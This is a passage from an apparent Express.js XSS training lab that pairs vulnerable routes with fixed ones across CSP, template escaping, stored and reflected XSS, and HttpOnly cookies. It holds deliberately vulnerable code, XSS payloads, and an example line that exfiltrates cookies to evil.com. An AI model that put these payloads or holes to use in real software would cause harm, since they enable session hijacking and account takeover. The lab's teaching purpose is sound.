      This is too strict for most apps (your own JS won't work), but it proves
      CSP can stop XSS at the browser level.</p>
      <p>Open DevTools → Console to see the violation report.</p>
      <p><strong>Trade-off:</strong> Maximum security, but your app can't use JavaScript at all.
      This only works for purely static HTML pages.</p>
    </details>
  `);
});

// --- 3c: Nonce-based CSP — allows specific inline scripts ---
app.get("/csp-nonce", (req, res) => {
  const nonce = crypto.randomBytes(16).toString("base64");

  res.set(
    "Content-Security-Policy",
    `default-src 'self'; script-src 'nonce-${nonce}'`
  );
  res.type("html").send(`
    <h1>Lab 3c: Nonce-Based CSP</h1>
    <p><a href="/">Back to labs</a></p>
    <p>CSP: <code>script-src 'nonce-${nonce}'</code></p>
    <p>Only scripts with the matching nonce attribute will execute.</p>

    <script nonce="${nonce}">
      const q = new URLSearchParams(window.location.search).get("q") || "";
      document.getElementById("output").innerHTML = q;
      document.getElementById("status").textContent = "App script executed (has nonce)";
    </script>

    <p>App script status: <strong id="status">did not run</strong></p>
    <div id="output"></div>

    <hr>

    <h3>Server-Side Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> nonce = crypto.<span style="color:#dcdcaa;">randomBytes</span>(16).<span style="color:#dcdcaa;">toString</span>(<span style="color:#ce9178;">"base64"</span>);

<span style="color:#6a9955;">// 1. Set the CSP header with the nonce</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">res.set("Content-Security-Policy", &#96;script-src 'nonce-&#36;{nonce}'&#96;);</span>

<span style="color:#6a9955;">// 2. Include the nonce in the script tag</span>
<span style="color:#6a9955;">//    Only scripts with this exact nonce will execute</span>
res.<span style="color:#dcdcaa;">send</span>(&#96;
  &lt;script <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">nonce="&#36;{nonce}"</span>&gt;  // matches CSP header — RUNS
    ...app code...
  &lt;/script&gt;

  // Attacker injects:
  // &lt;script&gt;alert('XSS')&lt;/script&gt;  — NO nonce, BLOCKED
  // &lt;img onerror=alert('XSS')&gt;     — inline handler, BLOCKED
&#96;);</code></pre>

    <h3>How Nonces Work</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Each request gets a DIFFERENT random nonce:</span>
<span style="color:#6a9955;">// Request 1: nonce = "a1b2c3d4..."</span>
<span style="color:#6a9955;">// Request 2: nonce = "x7y8z9w0..."</span>
<span style="color:#6a9955;">//</span>
<span style="color:#6a9955;">// The attacker can't predict the nonce, so they can't</span>
<span style="color:#6a9955;">// craft a &lt;script nonce="???"&gt; that will be accepted.</span>
<span style="color:#6a9955;">//</span>
<span style="color:#6a9955;">// IMPORTANT: Nonces must be cryptographically random</span>
<span style="color:#6a9955;">// and regenerated per request. A static nonce is useless.</span></code></pre>

    <details>
      <summary>What's happening?</summary>
      <p>The nonce is a random value generated per request. The server includes it
      in both the CSP header and the <code>&lt;script nonce="..."&gt;</code> tag.</p>
      <p>An attacker injecting <code>&lt;img onerror=alert()&gt;</code> or
      <code>&lt;script&gt;alert()&lt;/script&gt;</code> can't guess the nonce,
      so the browser blocks their script.</p>
      <p><strong>Key insight:</strong> The code still uses <code>innerHTML</code>
      (it's still "vulnerable" at the code level), but CSP prevents exploitation.
      This is defense in depth.</p>
    </details>
  `);
});

// --- 3d: Report-Only CSP — logs violations but doesn't block ---
app.get("/csp-report-only", (req, res) => {
  res.set(
    "Content-Security-Policy-Report-Only",
    "default-src 'self'; script-src 'none'"
  );
  res.type("html").send(`
    <h1>Lab 3d: CSP Report-Only Mode</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Header: <code>Content-Security-Policy-Report-Only</code></p>
    <p>Violations are logged to the console but <strong>not blocked</strong>.</p>
    <div id="output"></div>
    <script>
      const q = new URLSearchParams(window.location.search).get("q") || "";
      document.getElementById("output").innerHTML = q;
    </script>
    <hr>

    <h3>Server-Side Code</h3>
    <pre ${PRE}><code>app.<span style="color:#dcdcaa;">get</span>(<span style="color:#ce9178;">"/csp-report-only"</span>, (req, res) =&gt; {
  <span style="color:#6a9955;">// Note the different header name:</span>
  <span style="background:#3a3a1a;color:#d7ba7d;font-weight:bold;">res.set("Content-Security-Policy-Report-Only",</span>
  <span style="background:#3a3a1a;color:#d7ba7d;font-weight:bold;">        "default-src 'self'; script-src 'none'");</span>

  <span style="color:#6a9955;">// Same policy as Lab 3b, but Report-Only = dry run.</span>
  <span style="color:#6a9955;">// Browser logs violations to console but does NOT block them.</span>
});</code></pre>

    <h3>Enforcing vs. Report-Only</h3>
    <pre ${PRE}><code><span style="color:#89d185;">Content-Security-Policy: ...            // ENFORCES — blocks violations</span>
<span style="color:#d7ba7d;">Content-Security-Policy-Report-Only: ... // REPORTS — logs but allows</span>

<span style="color:#6a9955;">// Production rollout strategy:</span>
<span style="color:#6a9955;">// 1. Deploy with Report-Only</span>
<span style="color:#6a9955;">// 2. Monitor violation logs (DevTools console or report-uri endpoint)</span>
<span style="color:#6a9955;">// 3. Fix your own code that violates the policy</span>
<span style="color:#6a9955;">// 4. Switch to enforcing Content-Security-Policy</span></code></pre>

    <details>
      <summary>What's happening?</summary>
      <p><code>Content-Security-Policy-Report-Only</code> is the "dry run" version.
      The browser evaluates the policy and logs violations to the console,
      but still executes everything.</p>
      <p>Open DevTools → Console to see the violation warnings alongside the XSS firing.</p>
    </details>
  `);
});

// --- 3e: unsafe-inline defeats CSP ---
app.get("/csp-unsafe-inline", (req, res) => {
  res.set(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'unsafe-inline'"
  );
  res.type("html").send(`
    <h1>Lab 3e: CSP with 'unsafe-inline' (Defeated)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>CSP: <code>script-src 'unsafe-inline'</code></p>
    <p>This looks like CSP is enabled, but <code>'unsafe-inline'</code>
    allows all inline scripts — including attacker-injected ones.</p>
    <div id="output"></div>
    <script>
      const q = new URLSearchParams(window.location.search).get("q") || "";
      document.getElementById("output").innerHTML = q;
    </script>
    <hr>

    <h3>Server-Side Code</h3>
    <pre ${PRE}><code>app.<span style="color:#dcdcaa;">get</span>(<span style="color:#ce9178;">"/csp-unsafe-inline"</span>, (req, res) =&gt; {
  res.<span style="color:#dcdcaa;">set</span>(<span style="color:#ce9178;">"Content-Security-Policy"</span>,
    <span style="background:#5c1a1a;color:#f48771;font-weight:bold;">"default-src 'self'; script-src 'unsafe-inline'"</span>);  <span style="color:#f44747;">// &lt;-- THE MISTAKE</span>

  <span style="color:#6a9955;">// 'unsafe-inline' allows ALL inline scripts to run.</span>
  <span style="color:#6a9955;">// This includes attacker-injected &lt;script&gt; tags</span>
  <span style="color:#6a9955;">// and inline event handlers like onerror=...</span>
});</code></pre>

    <h3>Why Teams Do This</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Step 1: Team adds CSP</span>
<span style="color:#89d185;">Content-Security-Policy: script-src 'self'</span>

<span style="color:#6a9955;">// Step 2: App breaks — inline &lt;script&gt; tags stop working</span>
<span style="color:#6a9955;">// Step 3: Developer "fixes" it:</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">Content-Security-Policy: script-src 'unsafe-inline'</span>

<span style="color:#6a9955;">// Step 4: App works again! But CSP no longer protects against XSS.</span>
<span style="color:#6a9955;">// The correct fix: use nonces (Lab 3c) instead of 'unsafe-inline'.</span></code></pre>

    <details>
      <summary>What's happening?</summary>
      <p><code>'unsafe-inline'</code> is the most common CSP mistake.
      Teams add it because their app uses inline scripts and "CSP was breaking things."</p>
      <p>It makes the CSP header essentially decorative — it provides no real protection
      against XSS.</p>
      <p><strong>Lesson:</strong> If you see <code>'unsafe-inline'</code> in a CSP,
      the CSP is not protecting against XSS. Use nonces instead.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 4 — EJS Template Engine
   ======================================================================== */

// --- 4a: Auto-escaped output (what EJS <%= %> does) ---
app.get("/ejs-escaped", (req, res) => {
  const q = req.query.q || "";
  res.type("html").send(`
    <h1>Lab 4a: Template Auto-Escaping (Safe)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Simulates EJS <code>&lt;%= variable %&gt;</code> — auto-escaped.</p>
    <p>You searched for: <strong>${escapeHtml(q)}</strong></p>
    <hr>

    <h3>Server-Side Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> q = req.query.q;

<span style="color:#6a9955;">// The escapeHtml function replaces dangerous characters:</span>
<span style="color:#9cdcfe;">function</span> <span style="color:#dcdcaa;">escapeHtml</span>(str) {
  <span style="color:#c586c0;">return</span> String(str)
    .<span style="color:#dcdcaa;">replace</span>(<span style="color:#d16969;">/&amp;/g</span>, <span style="color:#ce9178;">"&amp;amp;"</span>)
    .<span style="color:#dcdcaa;">replace</span>(<span style="color:#d16969;">/&lt;/g</span>, <span style="color:#ce9178;">"&amp;lt;"</span>)     <span style="color:#6a9955;">// &lt; becomes &amp;lt;</span>
    .<span style="color:#dcdcaa;">replace</span>(<span style="color:#d16969;">/&gt;/g</span>, <span style="color:#ce9178;">"&amp;gt;"</span>)     <span style="color:#6a9955;">// &gt; becomes &amp;gt;</span>
    .<span style="color:#dcdcaa;">replace</span>(<span style="color:#d16969;">/"/g</span>, <span style="color:#ce9178;">"&amp;quot;"</span>)
    .<span style="color:#dcdcaa;">replace</span>(<span style="color:#d16969;">/'/g</span>, <span style="color:#ce9178;">"&amp;#39;"</span>);
}

res.<span style="color:#dcdcaa;">send</span>(&#96;You searched for: <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">&#36;{escapeHtml(q)}</span>&#96;);  <span style="color:#6a9955;">// &lt;-- SAFE</span>

<span style="color:#6a9955;">// Input:  &lt;img src=x onerror=alert('XSS')&gt;</span>
<span style="color:#6a9955;">// Output: &amp;lt;img src=x onerror=alert('XSS')&amp;gt;</span>
<span style="color:#6a9955;">// Browser shows the text, doesn't create an element.</span></code></pre>

    <h3>Framework Equivalents</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// All of these auto-escape by default:</span>
<span style="color:#89d185;">EJS:          &lt;%= variable %&gt;</span>
<span style="color:#89d185;">Django/Jinja: {{ variable }}</span>
<span style="color:#89d185;">Vue:          {{ variable }}</span>
<span style="color:#89d185;">React JSX:    {variable}</span>
<span style="color:#89d185;">Handlebars:   {{variable}}</span></code></pre>

    <details>
      <summary>What's happening?</summary>
      <p>The server escapes <code>&lt;</code> → <code>&amp;lt;</code>,
      <code>&gt;</code> → <code>&amp;gt;</code>, etc. before inserting into HTML.</p>
      <p>The browser renders the escaped entities as visible text, not as HTML tags.</p>
    </details>
  `);
});

// --- 4b: Raw/unescaped output (what EJS <%- %> does) ---
app.get("/ejs-raw", (req, res) => {
  const q = req.query.q || "";
  res.type("html").send(`
    <h1>Lab 4b: Raw Output — Unescaped (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Simulates EJS <code>&lt;%- variable %&gt;</code> — no escaping.</p>
    <p>You searched for: <strong>${q}</strong></p>
    <hr>

    <h3>Server-Side Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> q = req.query.q;

res.<span style="color:#dcdcaa;">send</span>(&#96;You searched for: <span style="background:#5c1a1a;color:#f48771;font-weight:bold;">&#36;{q}</span>&#96;);  <span style="color:#f44747;">// &lt;-- THE BUG — no escaping!</span>

<span style="color:#6a9955;">// Input:  &lt;img src=x onerror=alert('XSS')&gt;</span>
<span style="color:#6a9955;">// Output: &lt;img src=x onerror=alert('XSS')&gt;  (raw HTML!)</span>
<span style="color:#6a9955;">// Browser creates a real &lt;img&gt; element and fires onerror.</span></code></pre>

    <h3>What Changed (1 line)</h3>
    <pre ${PRE}><code><span style="color:#89d185;">res.send(&#96;...&#36;{escapeHtml(q)}...&#96;);  // Lab 4a — escaped, safe</span>
<span style="color:#f48771;text-decoration:line-through;">res.send(&#96;...&#36;{q}...&#96;);              // Lab 4b — raw, vulnerable</span>

<span style="color:#6a9955;">// In EJS template syntax:</span>
<span style="color:#89d185;">&lt;%= variable %&gt;   // auto-escaped (safe)</span>
<span style="color:#f48771;text-decoration:line-through;">&lt;%- variable %&gt;   // raw output (dangerous)</span></code></pre>

    <details>
      <summary>Why is this vulnerable?</summary>
      <p>The raw <code>&lt;%- %&gt;</code> syntax tells EJS "I trust this value,
      don't escape it." Devs use it for rendering trusted HTML (e.g., from a CMS).</p>
      <p>But if the value comes from user input (like a query parameter), it's XSS.</p>
      <p><strong>Common mistake:</strong> Devs switch from <code>&lt;%= %&gt;</code>
      to <code>&lt;%- %&gt;</code> because "the HTML wasn't rendering" — and
      accidentally create XSS.</p>
    </details>
  `);
});

// --- 4c: Escaped + CSP (defense in depth) ---
app.get("/ejs-with-csp", (req, res) => {
  const q = req.query.q || "";
  const nonce = crypto.randomBytes(16).toString("base64");

  res.set(
    "Content-Security-Policy",
    `default-src 'self'; script-src 'nonce-${nonce}'`
  );
  res.type("html").send(`
    <h1>Lab 4c: Escaping + CSP (Defense in Depth)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Two layers: server-side escaping AND nonce-based CSP.</p>
    <p>You searched for: <strong>${escapeHtml(q)}</strong></p>
    <script nonce="${nonce}">
      document.querySelector("p:last-of-type").style.color = "green";
    </script>
    <hr>

    <h3>Server-Side Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> q = req.query.q;
<span style="color:#9cdcfe;">const</span> nonce = crypto.<span style="color:#dcdcaa;">randomBytes</span>(16).<span style="color:#dcdcaa;">toString</span>(<span style="color:#ce9178;">"base64"</span>);

<span style="color:#6a9955;">// Layer 1: CSP with nonce</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">res.set("Content-Security-Policy", &#96;script-src 'nonce-&#36;{nonce}'&#96;);</span>

<span style="color:#6a9955;">// Layer 2: HTML escaping on output</span>
res.<span style="color:#dcdcaa;">send</span>(&#96;
  You searched for: <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">&#36;{escapeHtml(q)}</span>
  &lt;script <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">nonce="&#36;{nonce}"</span>&gt;
    // App script — has nonce, runs normally
  &lt;/script&gt;
&#96;);</code></pre>

    <h3>Why Two Layers?</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Escaping alone can fail:</span>
<span style="color:#6a9955;">//   - Dev forgets to escape one field</span>
<span style="color:#6a9955;">//   - Edge case in escaping logic</span>
<span style="color:#6a9955;">//   - Template uses raw output by mistake</span>
<span style="color:#6a9955;">//</span>
<span style="color:#6a9955;">// CSP alone can fail:</span>
<span style="color:#6a9955;">//   - Misconfigured with 'unsafe-inline'</span>
<span style="color:#6a9955;">//   - Policy too permissive</span>
<span style="color:#6a9955;">//   - Browser doesn't support CSP (old browsers)</span>
<span style="color:#6a9955;">//</span>
<span style="color:#89d185;">// Together: attacker must bypass BOTH to succeed.</span>
<span style="color:#89d185;">// This is defense in depth.</span></code></pre>

    <details>
      <summary>Why two layers?</summary>
      <p><strong>Layer 1 — Escaping:</strong> Prevents XSS by neutralizing HTML in output.</p>
      <p><strong>Layer 2 — CSP:</strong> Even if escaping is bypassed (a bug, a missed field),
      CSP blocks unauthorized script execution.</p>
      <p>In production, you want both. Neither is perfect alone.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 5 — Stored XSS (Persistent)
   ======================================================================== */

const guestbookVuln = [];
const guestbookSafe = [];

app.use(express.urlencoded({ extended: true }));

// --- 5a: Vulnerable guestbook ---
app.get("/stored-xss", (req, res) => {
  const entries = guestbookVuln
    .map((e) => `<li>${e.name}: ${e.message}</li>`)
    .join("");

  res.type("html").send(`
    <h1>Lab 5a: Stored XSS — Guestbook (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <form method="POST" action="/stored-xss">
      <input name="name" placeholder="Your name" required>
      <input name="message" placeholder="Your message" required>
      <button type="submit">Post</button>
    </form>
    <p>Try posting: <code>&lt;img src=x onerror=alert('Stored XSS')&gt;</code></p>
    <ul>${entries || "<li><em>No entries yet</em></li>"}</ul>
    <hr>

    <h3>Server-Side Code — Storing</h3>
    <pre ${PRE}><code>app.<span style="color:#dcdcaa;">post</span>(<span style="color:#ce9178;">"/stored-xss"</span>, (req, res) =&gt; {
  <span style="color:#6a9955;">// User input saved directly — no sanitization</span>
  <span style="background:#5c1a1a;color:#f48771;font-weight:bold;">guestbook.push({ name: req.body.name, message: req.body.message });</span>
  res.<span style="color:#dcdcaa;">redirect</span>(<span style="color:#ce9178;">"/stored-xss"</span>);
});</code></pre>

    <h3>Server-Side Code — Rendering</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> entries = guestbook
  .<span style="color:#dcdcaa;">map</span>((e) =&gt; &#96;&lt;li&gt;<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">&#36;{e.name}: &#36;{e.message}</span>&lt;/li&gt;&#96;)  <span style="color:#f44747;">// &lt;-- THE BUG</span>
  .<span style="color:#dcdcaa;">join</span>(<span style="color:#ce9178;">""</span>);

<span style="color:#6a9955;">// No escaping on output — stored HTML is rendered as-is.</span>
<span style="color:#6a9955;">// If message = "&lt;img src=x onerror=alert('XSS')&gt;"</span>
<span style="color:#6a9955;">// the browser creates a real &lt;img&gt; element for EVERY visitor.</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker posts <code>&lt;img src=x onerror=alert('XSS')&gt;</code> as message</li>
      <li>Server saves it to the database (here: in-memory array)</li>
      <li>Any user visits <code>/stored-xss</code></li>
      <li>Server renders the stored payload as raw HTML</li>
      <li>Browser fires the XSS — <strong>no crafted URL needed</strong></li>
    </ol>

    <details>
      <summary>Why is stored XSS worse?</summary>
      <p>With reflected XSS, you need to trick a victim into clicking your crafted URL.</p>
      <p>With stored XSS, the payload is saved in the database. Every user who visits
      the page gets hit — no social engineering needed.</p>
      <p>This is how XSS worms spread (Samy worm on MySpace, 2005).</p>
    </details>
  `);
});

app.post("/stored-xss", (req, res) => {
  guestbookVuln.push({ name: req.body.name, message: req.body.message });
  res.redirect("/stored-xss");
});

// --- 5b: Fixed guestbook ---
app.get("/stored-xss-fixed", (req, res) => {
  const entries = guestbookSafe
    .map(
      (e) =>
        `<li>${escapeHtml(e.name)}: ${escapeHtml(e.message)}</li>`
    )
    .join("");

  const nonce = crypto.randomBytes(16).toString("base64");
  res.set(
    "Content-Security-Policy",
    `default-src 'self'; script-src 'nonce-${nonce}'`
  );
  res.type("html").send(`
    <h1>Lab 5b: Stored XSS — Guestbook (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <form method="POST" action="/stored-xss-fixed">
      <input name="name" placeholder="Your name" required>
      <input name="message" placeholder="Your message" required>
      <button type="submit">Post</button>
    </form>
    <p>Try posting the same payload — it will be escaped.</p>
    <ul>${entries || "<li><em>No entries yet</em></li>"}</ul>
    <script nonce="${nonce}">
      document.querySelector("h1").style.borderLeft = "4px solid green";
    </script>
    <hr>

    <h3>Server-Side Code — Rendering (Fixed)</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> entries = guestbook
  .<span style="color:#dcdcaa;">map</span>((e) =&gt;
    &#96;&lt;li&gt;<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">&#36;{escapeHtml(e.name)}: &#36;{escapeHtml(e.message)}</span>&lt;/li&gt;&#96;  <span style="color:#6a9955;">// &lt;-- THE FIX</span>
  ).<span style="color:#dcdcaa;">join</span>(<span style="color:#ce9178;">""</span>);

<span style="color:#6a9955;">// Every field is escaped before rendering.</span>
<span style="color:#6a9955;">// Plus CSP with nonces as a second layer.</span></code></pre>

    <h3>What Changed</h3>
    <pre ${PRE}><code><span style="color:#f48771;text-decoration:line-through;">&#96;&lt;li&gt;&#36;{e.name}: &#36;{e.message}&lt;/li&gt;&#96;                         // raw — vulnerable</span>
<span style="color:#89d185;">&#96;&lt;li&gt;&#36;{escapeHtml(e.name)}: &#36;{escapeHtml(e.message)}&lt;/li&gt;&#96;  // escaped — safe</span>

<span style="color:#6a9955;">// + CSP header: script-src 'nonce-...'</span>
<span style="color:#6a9955;">// Even if escaping were bypassed, CSP blocks script execution.</span></code></pre>

    <details>
      <summary>What's different?</summary>
      <p>All output is escaped with <code>escapeHtml()</code> before rendering.
      Plus CSP with nonces as a second layer — defense in depth.</p>
    </details>
  `);
});

app.post("/stored-xss-fixed", (req, res) => {
  guestbookSafe.push({ name: req.body.name, message: req.body.message });
  res.redirect("/stored-xss-fixed");
});

/* ========================================================================
   LAB 6 — Reflected XSS (Server-Side)
   ======================================================================== */

// --- 6a: Vulnerable reflected ---
app.get("/reflected", (req, res) => {
  const q = req.query.q || "";
  res.type("html").send(`
    <h1>Lab 6a: Reflected XSS (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <form method="GET">
      <input name="q" value="${q}" placeholder="Search...">
      <button type="submit">Search</button>
    </form>
    <p>Results for: <strong>${q}</strong></p>
    <hr>

    <h3>Server-Side Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> q = req.query.q;

res.<span style="color:#dcdcaa;">send</span>(&#96;
  &lt;input name="q" value="<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">&#36;{q}</span>"&gt;                  <span style="color:#f44747;">// &lt;-- BUG 1: unescaped in attribute</span>
  &lt;p&gt;Results for: &lt;strong&gt;<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">&#36;{q}</span>&lt;/strong&gt;&lt;/p&gt;  <span style="color:#f44747;">// &lt;-- BUG 2: unescaped in body</span>
&#96;);

<span style="color:#6a9955;">// Two injection points, both unescaped.</span>
<span style="color:#6a9955;">// Bug 1 allows attribute breakout:</span>
<span style="color:#6a9955;">//   q = " onfocus=alert('XSS') autofocus="</span>
<span style="color:#6a9955;">//   renders: &lt;input value="" onfocus=alert('XSS') autofocus=""&gt;</span>
<span style="color:#6a9955;">//</span>
<span style="color:#6a9955;">// Bug 2 allows tag injection:</span>
<span style="color:#6a9955;">//   q = &lt;img src=x onerror=alert('XSS')&gt;</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker crafts URL with payload in <code>q</code></li>
      <li>Server reads <code>q</code> and inserts it <strong>unescaped</strong> into HTML</li>
      <li>Server sends the response — the payload is now in the page source</li>
      <li>Victim's browser parses the HTML and executes the injected code</li>
    </ol>
    <p><strong>Try this payload in the search box:</strong> <code>" onfocus=alert('XSS') autofocus="</code><br>
    It breaks out of the <code>value=""</code> attribute.</p>

    <details>
      <summary>What's happening?</summary>
      <p>The server takes the <code>q</code> parameter and inserts it directly
      into the HTML response. No escaping. The browser parses it as HTML.</p>
      <p><strong>Note:</strong> <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
      works more reliably than <code>&lt;script&gt;</code> tags across browsers.</p>
    </details>
  `);
});

// --- 6b: Fixed reflected ---
app.get("/reflected-fixed", (req, res) => {
  const q = req.query.q || "";
  const nonce = crypto.randomBytes(16).toString("base64");
  res.set(
    "Content-Security-Policy",
    `default-src 'self'; script-src 'nonce-${nonce}'`
  );
  res.type("html").send(`
    <h1>Lab 6b: Reflected XSS (Fixed)</h1>
    <p><a href="/">Back to labs</a></p>
    <form method="GET">
      <input name="q" value="${escapeHtml(q)}" placeholder="Search...">
      <button type="submit">Search</button>
    </form>
    <p>Results for: <strong>${escapeHtml(q)}</strong></p>
    <script nonce="${nonce}">
      document.querySelector("h1").style.borderLeft = "4px solid green";
    </script>
    <hr>

    <h3>Server-Side Code</h3>
    <pre ${PRE}><code><span style="color:#9cdcfe;">const</span> q = req.query.q;
<span style="color:#9cdcfe;">const</span> nonce = crypto.<span style="color:#dcdcaa;">randomBytes</span>(16).<span style="color:#dcdcaa;">toString</span>(<span style="color:#ce9178;">"base64"</span>);
res.<span style="color:#dcdcaa;">set</span>(<span style="color:#ce9178;">"Content-Security-Policy"</span>, &#96;script-src 'nonce-&#36;{nonce}'&#96;);

res.<span style="color:#dcdcaa;">send</span>(&#96;
  &lt;input name="q" value="<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">&#36;{escapeHtml(q)}</span>"&gt;                  <span style="color:#6a9955;">// &lt;-- FIXED: attribute escaped</span>
  &lt;p&gt;Results for: &lt;strong&gt;<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">&#36;{escapeHtml(q)}</span>&lt;/strong&gt;&lt;/p&gt;  <span style="color:#6a9955;">// &lt;-- FIXED: body escaped</span>
&#96;);</code></pre>

    <h3>What Changed</h3>
    <pre ${PRE}><code><span style="color:#f48771;text-decoration:line-through;">value="&#36;{q}"            // attacker breaks out with: " onfocus=alert() "</span>
<span style="color:#89d185;">value="&#36;{escapeHtml(q)}" // " becomes &amp;quot; — can't break out</span>

<span style="color:#f48771;text-decoration:line-through;">&#36;{q}                     // raw HTML injection</span>
<span style="color:#89d185;">&#36;{escapeHtml(q)}          // &lt; becomes &amp;lt; — displayed as text</span>

<span style="color:#6a9955;">// + CSP header as a second layer</span></code></pre>

    <details>
      <summary>What's different?</summary>
      <p>Both the results display AND the input value attribute are escaped.</p>
      <p><strong>Common mistake:</strong> Devs escape the visible output but forget
      to escape inside the <code>value="..."</code> attribute — which allows
      <code>" onfocus=alert('XSS') autofocus="</code> injection.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 7 — Cookie Theft + HttpOnly
   ======================================================================== */

const attackerLog = [];

// --- 7a: Vulnerable — cookies accessible to JavaScript ---
app.get("/cookie-theft", (req, res) => {
  res.set("Set-Cookie", "session_id=abc123secret; Path=/");
  res.type("html").send(`
    <h1>Lab 7a: Cookie Theft — No HttpOnly (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>A session cookie <code>session_id=abc123secret</code> was set <strong>without</strong> HttpOnly.</p>

    <h3>What JavaScript can see:</h3>
    <pre id="cookie-display" ${PRE}></pre>

    <h3>Simulated Exfiltration</h3>
    <p>Click below to simulate what an attacker's XSS payload would do:</p>
    <button onclick="exfiltrate()">Simulate cookie theft</button>
    <p id="exfil-status"></p>

    <script>
      document.getElementById("cookie-display").textContent = "document.cookie = " + JSON.stringify(document.cookie);

      function exfiltrate() {
        fetch("/attacker-log", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ stolen: document.cookie, source: "cookie-theft" })
        }).then(() => {
          document.getElementById("exfil-status").innerHTML =
            '<strong style="color:#c00;">Cookies sent to attacker endpoint!</strong> ' +
            '<a href="/attacker-log">View attacker log</a>';
        });
      }
    </script>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Server sets cookie WITHOUT HttpOnly</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">res.set("Set-Cookie", "session_id=abc123secret; Path=/");</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>

<span style="color:#6a9955;">// Attacker's XSS payload can read all non-HttpOnly cookies:</span>
<span style="color:#9cdcfe;">const</span> stolen = <span style="color:#4ec9b0;">document</span>.cookie;
<span style="color:#6a9955;">// stolen = "session_id=abc123secret"</span>

<span style="color:#6a9955;">// Exfiltrate to attacker's server:</span>
<span style="color:#dcdcaa;">fetch</span>(<span style="color:#ce9178;">"https://evil.com/steal?c="</span> + <span style="color:#4ec9b0;">document</span>.cookie);</code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Server sets a session cookie without <code>HttpOnly</code> flag</li>
      <li>Attacker achieves XSS (via any of the vectors in Labs 1-6)</li>
      <li>Attacker's script reads <code>document.cookie</code></li>
      <li>Script sends cookies to attacker-controlled server</li>
      <li>Attacker uses the stolen session to impersonate the victim</li>
    </ol>

    <details>
      <summary>Why is this dangerous?</summary>
      <p>XSS alone is bad, but <strong>cookie theft</strong> is what makes it devastating.
      With a stolen session cookie, the attacker doesn't need to stay on the page — they
      can use the session from their own browser.</p>
      <p>This is why XSS is ranked so high in OWASP Top 10 — it's the gateway to
      session hijacking, account takeover, and data theft.</p>
    </details>
  `);
});

// --- 7b: Fixed — HttpOnly + Secure + SameSite ---
app.get("/cookie-theft-fixed", (req, res) => {
  res.set("Set-Cookie", "session_id=abc123secret; Path=/; HttpOnly; SameSite=Strict");
  res.type("html").send(`
    <h1>Lab 7b: Cookie Theft — HttpOnly (Safe)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>A session cookie <code>session_id=abc123secret</code> was set <strong>with</strong> HttpOnly.</p>

    <h3>What JavaScript can see:</h3>
    <pre id="cookie-display" ${PRE}></pre>

    <h3>Simulated Exfiltration</h3>
    <p>Click below — even with XSS, the cookie can't be read:</p>
    <button onclick="exfiltrate()">Simulate cookie theft</button>
    <p id="exfil-status"></p>

    <script>
      var cookies = document.cookie;
      document.getElementById("cookie-display").textContent =
        "document.cookie = " + JSON.stringify(cookies) +
        "\\n\\n// The session_id cookie is NOT visible here!\\n// HttpOnly cookies are hidden from JavaScript.";

      function exfiltrate() {
        fetch("/attacker-log", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ stolen: document.cookie, source: "cookie-theft-fixed" })
        }).then(() => {
          document.getElementById("exfil-status").innerHTML =
            '<strong style="color:#070;">Cookie NOT leaked!</strong> ' +
            'document.cookie returned: <code>' + JSON.stringify(cookies) + '</code> ' +
            '<a href="/attacker-log">View attacker log</a>';
        });
      }
    </script>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Server sets cookie WITH HttpOnly + SameSite</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">res.set("Set-Cookie", "session_id=abc123secret; Path=/; HttpOnly; SameSite=Strict");</span>

<span style="color:#6a9955;">// Now in JavaScript:</span>
<span style="color:#9cdcfe;">const</span> stolen = <span style="color:#4ec9b0;">document</span>.cookie;
<span style="color:#6a9955;">// stolen = "" — the session_id cookie is INVISIBLE</span>

